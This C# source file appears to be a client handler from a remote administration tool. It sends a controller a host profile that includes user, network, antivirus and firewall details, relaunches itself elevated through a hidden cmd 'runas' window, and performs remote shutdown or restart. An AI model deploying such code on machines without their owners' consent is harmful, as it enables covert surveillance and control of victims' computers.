using Client.Helper;
using Client.IO;
using Client.IpGeoLocation;
using Client.Networking.Packets.ClientServices;
using Client.Networking.Packets.SystemInfo;
using Client.User;
using Common.Enums;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace Client.Networking.Handlers
{
    public class ClientServicesHandler : IDisposable
    {
        private readonly Client _client;
        private readonly FrmMain _application;

        public ClientServicesHandler(FrmMain application, Client client)
        {
            _application = application;
            _client = client;
        }

        public async Task Handle()
        {
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

            var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
            var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";

            var geoInfo = GeoInformationFactory.GetGeoInformation();
            var userAccount = new UserAccount();

            List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
            {
                new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
                new Tuple<string, string>("Memory (RAM)", $"{HardwareDevices.TotalPhysicalMemory} MB"),
                new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuName),
                new Tuple<string, string>("Username", userAccount.UserName),
                new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
                new Tuple<string, string>("Domain Name", domainName),
                new Tuple<string, string>("Host Name", hostName),
                new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
                new Tuple<string, string>("System Directory", Environment.SystemDirectory),
                new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
                new Tuple<string, string>("MAC Address", HardwareDevices.MacAddress),
                new Tuple<string, string>("LAN IP Address", HardwareDevices.LanIpAddress),
                new Tuple<string, string>("WAN IP Address", geoInfo.IpAddress),
                new Tuple<string, string>("ASN", geoInfo.Asn),
                new Tuple<string, string>("ISP", geoInfo.Isp),
                new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
                new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                new Tuple<string, string>("Time Zone", geoInfo.Timezone),
                new Tuple<string, string>("Country", geoInfo.Country)
            };

            _ = _client.QueuePacketAsync(new SystemInfoPacket
            {
                SystemInfos = lstInfos
            });
        }

        public async Task Reconnect()
        {
            _client.Disconnect();
        }

        public async Task Disconnect()
        {
            _client.Exit();
        }

        public async Task AskElevate()
        {
            var userAccount = new UserAccount();
            if (userAccount.Type != AccountType.Admin)
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    _ = _client.QueuePacketAsync(new StatusClientPacket { Message = "User refused the elevation request." });
                    return;
                }
                _client.Exit();
            }
            else
            {
                _ = _client.QueuePacketAsync(new StatusClientPacket { Message = "Process already elevated." });
            }
        }

        public async Task ShutdownActionHandler(ShutdownActionPacket packet)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (packet.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                _ = _client.QueuePacketAsync(new StatusClientPacket { Message = $"Action failed: {ex.Message}" });
            }
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
